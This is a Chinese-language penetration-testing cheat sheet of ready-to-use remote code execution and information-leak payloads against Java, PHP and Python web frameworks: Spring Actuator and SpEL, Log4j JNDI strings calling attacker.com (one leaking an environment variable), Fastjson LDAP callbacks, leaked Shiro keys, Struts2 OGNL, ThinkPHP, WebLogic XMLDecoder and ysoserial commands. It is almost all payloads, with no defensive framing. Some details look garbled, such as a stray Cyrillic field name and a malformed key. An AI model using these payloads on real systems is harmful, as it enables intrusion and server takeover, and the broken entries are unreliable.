# 框架漏洞补充

## 1. Spring Boot Actuator

### 端点探测

```
/actuator
/actuator/env
/actuator/health
/actuator/heapdump
/actuator/loggers
/actuator/refresh
/actuator/mappings
/actuator/beans
/actuator/scheduledtasks
/actuator/conditions
```

### 环境变量泄露

```
/actuator/env
GET /actuator/env/{name}
```

### RCE利用

```
POST /actuator/refresh
Content-Type: application/json

{"name":"test","value":"#{T(java.lang.Runtime).getRuntime().exec('whoami')}"}
```

### Jolokia RCE

```
/actuator/jolokia/exploit
```

---

## 2. Spring Cloud Gateway RCE (CVE-2022-22947)

```
POST /actuator/gateway/routes/hack
{
  "id": "hacked",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "nameValue": "result",
      "value": "#{new String(T(java.lang.Runtime).getRuntime().exec('whoami').inputStream.readAllBytes())}"
    }
  }],
  "uri": "http://example.com",
  "order": 0
}
```

---

## 3. Spring WebFlow RCE (CVE-2017-4971)

```
<form id="f" action="http://target:8080/login" method="post">
  <input name="execution" value="e4s1"/>
  <input name="_eventId" value="view"/>
  <input type="submit" id="btn"/>
</form>

添加header:
Cookie: JSESSIONID=xxx
```

---

## 4. Spring Data Rest RCE (CVE-2017-8046)

```
PATCH /users/1
Content-Type: application/json

{"name": "test", "age": 1, "ружителей": "T(java.lang.Runtime).getRuntime().exec('whoami')"}
```

---

## 5. Spring SpEL注入

### 基础RCE

```
${T(java.lang.Runtime).getRuntime().exec('id')}
${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
```

### 读取文件

```
${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File).new('/etc/passwd'))}
```

---

## 6. Log4j RCE (CVE-2021-44228)

### 基础Payload

```
${jndi:ldap://attacker.com/a}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}
```

### 变形Payload

```
${jndi:rmi://attacker.com/Exploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/${env:USER}}
```

---

## 7. Log4j 2.X RCE (CVE-2021-45046)

```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${jndi:ldap://127.0.0.1/${${sys:java.version}}.log}
```

---

## 8. Fastjson反序列化

### 基础Payload

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### JdbcRowSetImpl

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### TemplatesImpl

```
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64"],"_name":"a","_tfactory":{},"_outputProperties":{}}
```

---

## 9. Shiro反序列化

### RememberMe攻击

```
# 常见密钥
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3KprsdGv==
2AvVhdsgPKx6SN9QAtgZ5cS3GJdO+R2MkY2QE4wfVG+lPvEllb6CdArF

# 工具
java -jar shiro-attack-2.0.jar
java -jar ysoserial.jar CommonsBeanUtils1 "command"
```

---

## 10. Struts2 RCE

### 基础Payload

```
%{#a=(new java.lang.ProcessBuilder('id')).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[4096],#d.read(#e),#t=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#t.getWriter().write(new java.lang.String(#e))}
```

### S2-016

```
redirect:${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23memberAccess,true),%23a=(new java.lang.ProcessBuilder('whoami')).start(),%23b=%23a.getInputStream(),%23c=new java.io.BufferedReader(new java.io.InputStreamReader(%23b)),%23d=new char[50000],%23c.read(%23d),%23t=%23context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],%23t.getWriter().write(%23d)}
```

---

## 11. ThinkPHP RCE

### 5.x RCE

```
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

### 5.0.x RCE

```
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

### 5.1.x RCE

```
/index.php?s=index/\think\Request/input&filter=system&whoami
```

---

## 12. Laravel RCE

### .env泄露

```
/.env
/.env.bak
/.env.backup
```

### 密钥利用

```
php artisan tinker
App::make('config')->set('database.connections.mysql.host', 'xxx')
```

### 序列化RCE (Laravel <= 8.4.2)

```
# 使用laravel-exploits
python3 laravel-ignition-exploit.py URL COMMAND
```

---

## 13. Django

### 配置文件泄露

```
/settings.py
/urls.py
/admin.py
```

### 调试模式RCE

```
# 设置DEBUG=True
# 访问不存在页面会显示敏感信息
```

---

## 14. Flask

### 配置文件泄露

```
config.py
instance/config.py
```

### 模板注入

```
# Jinja2 SSTI
{{config.items()}}
{{request}}
```

---

## 15. WebLogic RCE

### XMLDecoder

```
POST /wls-wsat/CoordinatorPortType
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2003/05/soap-envelope">
<java version="1.8.0_151" class="java.beans.Expression">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="1">
<void index="0"><string>whoami</string></void>
</array>
</void>
</object>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

### T3协议

```
# 使用weblogic.py
python3 weblogic.py target:7001 cmd
```

---

## 16. JBoss反序列化

### 探测

```
/invoker/JMXInvokerServlet
/admin-console
/jbossws/
```

### 利用

```
# 使用ysoserial
java -jar ysoserial.jar CommonsCollections1 "command" > payload.ser

# 上传payload
```

---

## 17. Tomcat

### CVE-2020-1938 (Ghostcat)

```
# 读取WEB-INF/web.xml
java -jar ajp.jar target 8009 /WEB-INF/web.xml
```

### 弱口令+WAR部署

```
# 上传war包
```

---

## 18. Hudson CI RCE

```
/script
/job/xxx/config.xml
```
